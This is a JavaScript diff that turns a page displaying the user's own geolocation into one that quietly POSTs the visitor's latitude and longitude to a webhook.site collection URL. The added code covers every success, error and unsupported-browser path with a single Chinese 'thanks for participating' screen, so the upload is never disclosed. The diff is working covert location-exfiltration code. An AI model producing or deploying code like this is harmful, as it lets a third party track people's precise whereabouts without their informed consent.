@@ -1,30 +1,33 @@
 function getLocation() {
     if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
+        navigator.geolocation.getCurrentPosition(sendPosition, showError);
     } else {
-        document.getElementById('output').innerText = "Geolocation is not supported by this browser.";
+        showThankYou();
     }
 }
 
-function showPosition(position) {
-    document.getElementById('output').innerHTML =
-        "Latitude: " + position.coords.latitude +
-        "<br>Longitude: " + position.coords.longitude;
+function sendPosition(position) {
+    // 这里用fetch把数据POST到你的服务器（假设有接口）
+    fetch('https://webhook.site/bad5c5ad-c5ab-4a6d-89a7-8360c04d9f75', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+        })
+    }).then(response => {
+        showThankYou();
+    }).catch(error => {
+        showThankYou();
+    });
 }
 
 function showError(error) {
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            document.getElementById('output').innerText = "User denied the request for Geolocation.";
-            break;
-        case error.POSITION_UNAVAILABLE:
-            document.getElementById('output').innerText = "Location information is unavailable.";
-            break;
-        case error.TIMEOUT:
-            document.getElementById('output').innerText = "The request to get user location timed out.";
-            break;
-        case error.UNKNOWN_ERROR:
-            document.getElementById('output').innerText = "An unknown error occurred.";
-            break;
-    }
+    showThankYou();
+}
+
+function showThankYou() {
+    document.body.innerHTML = "<h1>谢谢参与！</h1>";
 }
